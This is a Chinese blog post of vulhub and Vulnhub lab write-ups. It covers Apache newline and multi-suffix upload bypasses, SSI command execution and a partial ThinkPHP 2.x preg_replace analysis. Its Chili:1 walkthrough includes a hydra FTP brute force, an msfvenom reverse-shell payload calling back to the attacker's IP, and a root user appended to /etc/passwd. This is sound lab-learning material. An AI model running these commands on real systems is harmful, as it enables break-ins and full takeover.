@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Vulnhub靶场练习 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Vulnhub靶场练习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Vulnhub靶场练习
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/06/17/Vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="article-date">
+  <time datetime="2021-06-17T09:40:28.000Z" itemprop="datePublished">2021-06-17</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/">刷题站</a> / <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AB%99/vulhub/">vulhub</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">14 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="Apache-HTTPD-换行解析漏洞"><a href="#Apache-HTTPD-换行解析漏洞" class="headerlink" title="Apache HTTPD 换行解析漏洞"></a>Apache HTTPD 换行解析漏洞</h2><p><strong>Apache HTTPD 换行解析漏洞  CVE-2017-15715</strong></p>
+<p>环境搭建:利用vulhub  httpd模块的环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build  #将镜像拉到本地</span><br><span class="line">docker-compose up -d  #启动漏洞环境*</span><br></pre></td></tr></table></figure>
+
+<p>影响版本: Apache 2.4.0~2.4.29<br>影响说明: 绕过服务器策略，上传webshell<br>环境说明: PHP5.5、Apache2.4.10<br>漏洞原理:</p>
+<p>在httpd2.4.0~2.4.29版本中有如下配置</p>
+<p>   SetHandler application/x-httpd-php</p>
+<p>这是httpd解析php文件的表达式，关键在于表达式结尾的$字符，这个字符在正则表达式中用于匹配字符串结尾的位置，同时也会匹配换行符号。</p>
+<p>若是黑名单匹配，我们上传是就可以成功，并且在解析是会匹配换行符，访问时在php后面加上%0a就能正常访问。</p>
+<p>但是在使用中大部分情况下是作为文件名，这样会自动过滤换行符</p>
+<p>且在windows上面%0a无法作为后缀 </p>
+<p>打开环境界面是一片空白 </p>
+<p>我们需要构建上传表单</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://?.?.?.?:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果这里想要直接上传文件名为1.php%0a的文件，那么结果也是不成功的，因为$_FILES[‘file’]会直接过滤掉%0a</p>
+<p>我们需要用bp抓包，然后在文件名后面加上一个换行</p>
+<p><img src="https://img-blog.csdnimg.cn/20210622093021395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>浏览器输入  <code>url/aa.php%0a</code> 就能看到解析成php了  绕过了黑名单</p>
+<p><img src="https://img-blog.csdnimg.cn/202106220932470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="Apache-httpd-多后缀解析漏洞"><a href="#Apache-httpd-多后缀解析漏洞" class="headerlink" title="Apache httpd 多后缀解析漏洞"></a>Apache httpd 多后缀解析漏洞</h2><p>漏洞原理<br>apache httpd支持一个文件有多个后缀，如：test1.php.pdf 。在windows下，会直接根据最后的.来进行分隔，将其判定为pdf文件，但在apache中可不是这样的，apache会从后往前依次进行判别，遇到不认识的后缀，便会往前读，如果还是不认识再往前，若是到最后一个都不认识，则会将该文件当成默认类型文件读取。<br>那么有人要问了，我怎么知道它认识哪些不认识哪些呢？在/etc下有个mime.types文件定义了apache可以识别的文件后缀。</p>
+<p>该解析漏洞产生的原因一部分是基于apache的这种特性，还有一大部分原因都是由于开发人员的配置不当构成的，当运维人员在配置文件给.php添加了处理器时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br><span class="line">多后缀的文件名中只要存在.php后缀，则就会将该文件当做php文件解析。</span><br></pre></td></tr></table></figure>
+
+<p>环境搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build  #将镜像拉到本地</span><br><span class="line">docker-compose up -d  #启动漏洞环境*</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it  [contai nid] /bin/bahs</span><br></pre></td></tr></table></figure>
+
+<p>进入环境查看源码</p>
+<p>;</p>
+<p>上传一个  aa.php.jpg</p>
+<p><img src="https://img-blog.csdnimg.cn/20210622095356383.png" alt="在这里插入图片描述"></p>
+<p>可以看到上传成功了</p>
+<p>我们访问路径可以看到解析成 php了</p>
+<h2 id="Apache-ssl远程命令执行漏洞"><a href="#Apache-ssl远程命令执行漏洞" class="headerlink" title="Apache ssl远程命令执行漏洞"></a>Apache ssl远程命令执行漏洞</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用#exec cmd=“id” 语法执行任意命令。</p>
+<h3 id="SSI-服务器端包含"><a href="#SSI-服务器端包含" class="headerlink" title="SSI 服务器端包含"></a>SSI 服务器端包含</h3><p>SSI（server-side includes）能帮我们实现什么功能：<br>SSI提供了一种对现有HTML文档增加动态内容的方法，即在html中加入动态内容。</p>
+<p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
+<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意命令。</p>
+<p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="ls /" -->语法执行任意命令。</p>
+<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用&lt;!--#exec cmd=&quot;id&quot; --&gt;语法执行命令。</span><br><span class="line"></span><br><span class="line">使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为&quot;服务器端嵌入&quot;或者叫&quot;服务器端包含&quot;，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="复现开始"><a href="#复现开始" class="headerlink" title="复现开始"></a>复现开始</h3><p>进入 /url/upload.php</p>
+<p>上传 php发现不行  我们bp抓包上传  <code>.shtml</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210622101906758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>可以发现成功命令执行了</p>
+<p><img src="C:\Users\wh1tecell\AppData\Roaming\Typora\typora-user-images\image-20210622101845954.png" alt="image-20210622101845954"></p>
+<h2 id="Chili-1"><a href="#Chili-1" class="headerlink" title="Chili:1"></a>Chili:1</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/chili-1,558/">https://www.vulnhub.com/entry/chili-1,558/</a></p>
+<p>下载<a target="_blank" rel="noopener" href="https://download.vulnhub.com/chili/Chili.ova">https://download.vulnhub.com/chili/Chili.ova</a>  然后右键用vmware打开即可</p>
+<p>我这里使用的nat模式连接</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.94.197/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210617123905206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -O -p-  192.168.94.247</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210617124251872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>发现开启了 21 ftp端口</p>
+<h3 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h3><p>访问 ip的 80端口  发现啥也没有</p>
+<p>看到提示 </p>
+<ul>
+<li>Hint : “If you ever get stuck, try again with the name of the lab”</li>
+</ul>
+<p>感觉是爆破ftp 获得密码</p>
+<p>账号就用提示的 chili</p>
+<p>密码脚本用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l chili -P /usr/share/wordlists/rockyou.txt -f -V ftp://192.168.94.247</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210617141246613.png" alt="在这里插入图片描述"></p>
+<p>发现了密码  </p>
+<p>直接ftp登录吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.94.247</span><br></pre></td></tr></table></figure>
+
+<p>然后用 msf拿个shell</p>
+<p>进入网站根目录，发现有隐藏文件，且.nano是具有最高权限的目录文件，考虑在该目录下传入木马</p>
+<p>先生成木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.94.197 LPORT=2233 -f raw  &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后将该木马传到靶机的.nano目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put /home/kali/桌面/shell.php  aa.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210617151500436.png" alt="在这里插入图片描述"></p>
+<p>目前aa.php没有可执行权限，给它赋予最高权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 aa.php</span><br></pre></td></tr></table></figure>
+
+<p>成功上传后，这里我们通过msf反弹shell，在kali端口开启端口监听，然后通过浏览器访问我们的木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.94.197</span><br><span class="line">set LPORT 2233</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>可以看到建立连接了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210617151252649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后进入shell模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>切换交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看了看自己权限  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data</span><br></pre></td></tr></table></figure>
+
+<p>上传一个linux提权脚本 </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20210617152517849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>使用ftp 上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put  /home/kali/桌面/privilege-escalation-awesome-scripts-suite-master/privilege-escalation-awesome-scripts-suite-master/linPEAS/linpeas.sh  /var/www/html/.nano/a.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后再msf 终端  执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./a.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现/etc/passwd对于其他用户有写的权限，这里我们可以直接添加一个高权限用户进去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt salt l1yee</span><br><span class="line">$1$salt$6GXvLeiShroUP6WTte.ny/</span><br><span class="line">echo &#x27;salt:$1$salt$6GXvLeiShroUP6WTte.ny/:0:0::/root:/bin/bash&#x27;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2021061715224489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su salt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210617153511955.png" alt="在这里插入图片描述"></p>
+<p>成功获取 root权限</p>
+<p>参:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/14096084.html">https://www.cnblogs.com/zzjdbk/p/14096084.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sym945/p/13723537.html">https://www.cnblogs.com/sym945/p/13723537.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/108928297">https://blog.csdn.net/qq_42967398/article/details/108928297</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40549070/article/details/108926099">https://blog.csdn.net/qq_40549070/article/details/108926099</a></p>
+<h2 id="ThinkPHP-2-x-任意代码执行漏洞"><a href="#ThinkPHP-2-x-任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x 任意代码执行漏洞"></a>ThinkPHP 2.x 任意代码执行漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>在ThinkPHP ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = preg_replace(&#x27;@(\w+)&#x27;.$depr.&#x27;([^&#x27;.$depr.&#x27;\/]+)@e&#x27;, &#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;, implode($depr,$paths));</span><br></pre></td></tr></table></figure>
+
+<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p>
+<p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>
+<h3 id="正则知识"><a href="#正则知识" class="headerlink" title="正则知识"></a>正则知识</h3><ul>
+<li><strong>runoo+b</strong>，可以匹配 runoob、runooob、runoooooob 等，+ 号代表前面的字符必须至少出现一次（1次或多次）。</li>
+<li><strong>runoo*b</strong>，可以匹配 runob、runoob、runoooooob 等，* 号代表前面的字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。</li>
+<li><strong>colou?r</strong> 可以匹配 color 或者 colour，? 问号代表前面的字符最多只可以出现一次（0次、或1次）。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(.+)默认是贪婪匹配</span><br><span class="line">(.+?)为惰性匹配</span><br><span class="line">疑问号让.+的搜索模式从贪婪模式变成惰性模式。</span><br><span class="line">var str = &#x27;aaa&lt;div style=&quot;font-color:red;&quot;&gt;123456&lt;/div&gt;bbb&#x27;</span><br><span class="line">&lt;.+?&gt;会匹配&lt;div style=&quot;font-color:red;&quot;&gt;</span><br><span class="line">&lt;.+&gt;会匹配&lt;div style=&quot;font-color:red;&quot;&gt;123456&lt;/div&gt;</span><br><span class="line">要在浏览器测试结果的话，输入:</span><br><span class="line">var str = &#x27;aaa&lt;div style=&quot;font-color:red;&quot;&gt;123456&lt;/div&gt;bbb&#x27;</span><br><span class="line">str.match(/&lt;.+?&gt;/);</span><br><span class="line">str.match(/&lt;.+&gt;/);</span><br><span class="line">下面举个简单的例子来说明。</span><br><span class="line">1.贪婪匹配是先看整个字符串是否匹配，如果不匹配，它会去掉字符串的最后一个字符，并再次尝试。如果还不匹配，那么再去掉当前最后一个，直到发现匹配或不剩任何字符。</span><br><span class="line">var str=&#x27;abcdabceba&#x27;</span><br><span class="line">/.+b/     //匹配一个或多个任意字符后面跟一个字母b</span><br><span class="line">执行str.match(/.+b/)</span><br><span class="line">第一次(先看整个字符串是否是一个匹配) abcdabceba 不匹配,然后去掉最后一个字符a</span><br><span class="line">第二次(去掉最后一个字符后再匹配) abcdabceb 匹配，返回abcdabceb。</span><br><span class="line">2.惰性匹配是从左侧第一个字符开始向右匹配, 先看第一个字符是不是一个匹配, 如果不匹配就加入下一个字符再尝式匹配, 直到发现匹配...</span><br><span class="line">执行str.match(/.+?b/)</span><br><span class="line">第一次(读入左侧第一个字符) a 不匹配加一个再式</span><br><span class="line">第二次 ab 匹配,返回ab</span><br><span class="line">当正则表达式中包含重复量词(如：*,?,+)时，通常的行为是匹配尽可能多的字符，比如：a(.*)b去匹配aabab字符串，它会匹配整个字符串，这被称为贪婪匹配。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="preg-replace函数之命令执行"><a href="#preg-replace函数之命令执行" class="headerlink" title="preg_replace函数之命令执行"></a>preg_replace函数之命令执行</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2577">https://xz.aliyun.com/t/2577</a></p>
+<h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><ul>
+<li>ThinkPHP的url规则<br>thinkphp 所有的主入口文件默认访问index控制器（模块）<br>thinkphp 所有的控制器默认执行index动作（方法）<br>存在漏洞的static public function dispatch()，叫URL映射控制器，也就是URL访问的路径是映射到哪个控制器下。<br>ThinkPHP5.1在没有定义路由的情况下典型的URL访问规则是：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line">http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><p>漏洞出现在Dispatcher.class.php这个文件中的url解析，代码太多了，只贴关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$depr</span> = C(<span class="string">&#x27;URL_PATHINFO_DEPR&#x27;</span>);</span><br><span class="line"><span class="comment">// 分析PATHINFO信息</span></span><br><span class="line"><span class="built_in">self</span>::getPathInfo();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">self</span>::routerCheck())&#123;   <span class="comment">// 检测路由规则 如果没有则按默认规则调度URL</span></span><br><span class="line">    <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$var</span>  =  <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">        <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>))))) &#123;</span><br><span class="line">            <span class="comment">// 禁止直接访问分组</span></span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class="comment">// 还没有定义模块名称</span></span><br><span class="line">        <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">    <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">    <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">    <span class="variable">$_GET</span>   =  array_merge(<span class="variable">$var</span>,<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先 $depr变量为PATHINFO模式下，各参数之间的分隔符号。之后调用getPathInfo()函数，此函数获得服务器的PATH_INFO信息，PATH_INFO是PHP的一种路由模式，定位到convention.php配置文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// PATHINFO 模式,使用数字1、2、3代表以下三种模式:</span><br><span class="line">    // 1 普通模式(参数没有顺序,例如/m/module/a/action/id/1);</span><br><span class="line">    // 2 智能模式(系统默认使用的模式，可自动识别模块和操作/module/action/id/1/ 或者 /module,action,id,1/...);</span><br><span class="line">    // 3 兼容模式(通过一个GET变量将PATHINFO传递给dispather，默认为s index.php?s=/module/action/id/1)</span><br></pre></td></tr></table></figure>
+
+<p>重点是后面</p>
